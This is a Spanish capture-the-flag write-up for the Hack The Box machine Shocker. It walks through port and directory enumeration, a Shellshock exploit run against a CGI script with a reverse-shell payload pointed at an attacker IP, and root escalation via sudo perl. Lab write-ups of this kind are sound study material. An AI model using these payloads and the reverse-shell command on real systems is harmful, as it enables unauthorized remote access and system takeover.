---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - HTTP
  - Searchsploit
  - MSF
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Enumeración del sistema|Enumeración del sistema]]
	- [[#Enumeración#Enumeración de puertos|Enumeración de puertos]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
	- [[#Enumeración#Identificación de vulnerabilidades|Identificación de vulnerabilidades]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Shellshock|Shellshock]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#Sudo|Sudo]]


---
# Shocker

![](Screenshots/Pasted%20image%2020260501181655.png)

>Máquina de Hack The Box llamada **[Shocker](https://app.hackthebox.com/machines/Shocker)**, centrada en la explotación de la vulnerabilidad **Shellshock** en un servicio Apache con `mod_cgi` habilitado.
>La intrusión comienza con la enumeración de un endpoint **CGI** vulnerable, lo que permite ejecución remota de comandos mediante variables de entorno manipuladas. Esto proporciona acceso inicial al sistema como el usuario `shelly`.  
>Finalmente, mediante la enumeración de privilegios, se identifica que el usuario puede ejecutar `perl` como root vía `sudo`, lo que permite escalar privilegios fácilmente utilizando técnicas de **GTFOBins**, obteniendo acceso completo al sistema.

---
## Enumeración
### Enumeración del sistema

```PowerShell
ping -c 1 10.129.29.186
PING 10.129.29.186 (10.129.29.186) 56(84) bytes of data.
64 bytes from 10.129.29.186: icmp_seq=1 ttl=63 time=36.8 ms

--- 10.129.29.186 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 36.823/36.823/36.823/0.000 ms
```

El TTL de `63` (típico en redes Linux con decremento de 1 salto) sugiere que el sistema objetivo es Linux.
### Enumeración de puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.29.186 -oG allPorts
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 63
2222/tcp open  EtherNetIP-1 syn-ack ttl 63
```

```PowerShell
nmap -p80,2222 -sCV 10.129.29.186 -oN targeted
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Puertos descubiertos:
- `80 → HTTP`
- `2222 → SSH`
### HTTP

```HTTP
http://10.129.29.186/
```

![](Screenshots/Pasted%20image%2020260501114025.png)
#### Fuzzing Web

```PowerShell
dirb http://10.129.29.186/
---- Scanning URL: http://10.129.29.186/ ----
+ http://10.129.29.186/cgi-bin/ (CODE:403|SIZE:295)                                                                                                                                                                                         
+ http://10.129.29.186/index.html (CODE:200|SIZE:137)                                                                                                                                                                                       
+ http://10.129.29.186/server-status (CODE:403|SIZE:300)

dirb http://10.129.29.186/cgi-bin/ -X .sh
---- Scanning URL: http://10.129.29.186/cgi-bin/ ----
+ http://10.129.29.186/cgi-bin/user.sh (CODE:200|SIZE:118)
```

```HTTP
http://10.129.29.186/cgi-bin/user.sh
```

![458](Screenshots/Pasted%20image%2020260501124948.png)

Este tipo de rutas es especialmente relevante, ya que los scripts **CGI** pueden ser vectores de ejecución remota si están mal configurados o utilizan intérpretes vulnerables.
### Identificación de vulnerabilidades

Dado que el servidor utiliza Apache con soporte **CGI**, se investiga la existencia de vulnerabilidades conocidas asociadas, identificando **Shellshock**, una vulnerabilidad crítica en Bash que afecta a scripts **CGI**.

Se realiza una búsqueda mediante `searchsploit` y se descarga el exploit.

```PowerShell
searchsploit "Apache mod_cgi"
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache mod_cgi - 'Shellshock' Remote Command Injection                                                                                                                                                    | linux/remote/34900.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

searchsploit -m linux/remote/34900.py
```

---
## Explotación
### Shellshock

**Shellshock** es una vulnerabilidad crítica descubierta en 2014 que afecta a **GNU Bash**, el intérprete de comandos ampliamente utilizado en sistemas Unix/Linux.

El problema radica en cómo Bash procesa variables de entorno. Bash permite definir funciones dentro de variables de entorno, pero debido a un fallo en su implementación, es posible añadir comandos adicionales después de la definición de la función. Estos comandos se ejecutan automáticamente cuando Bash procesa la variable.

Un ejemplo simplificado del formato vulnerable sería:

```PowerShell
() { :; }; COMMAND
```

Cuando Bash interpreta esta variable, no solo define la función, sino que también ejecuta el comando.

Se puede explotar con **MSF**, mediante el exploit `exploit/multi/http/apache_mod_cgi_bash_env_exec`, en mi caso, no funciono correctamente.

Se ejecuta de manera manual con el exploit descargado de `searchsploit`.

```PowerShell
python2.7 34900.py payload=reverse rhost=10.129.29.186 lhost=[ATTACKER_IP] lport=1234 pages=/cgi-bin/user.sh
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.129.29.186
10.129.29.186>
```

Se obtiene una consola interactiva con el usuario `shelly`.

La flag de `usuario` se encuentra en: `/home/shelly`.

---
## Escalada de Privilegios
### Sudo

Se enumeran privilegios sudo en busca de binarios ejecutables como root sin contraseña.

```PowerShell
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Se realiza una búsqueda con [GTFOBins - Perl](https://gtfobins.org/gtfobins/perl/).

```PowerShell
sudo perl -e 'exec "/bin/sh"'
```

Se obtiene una consola interactiva con `root`.

La flag de `root` se encuentra en: `/root`.

---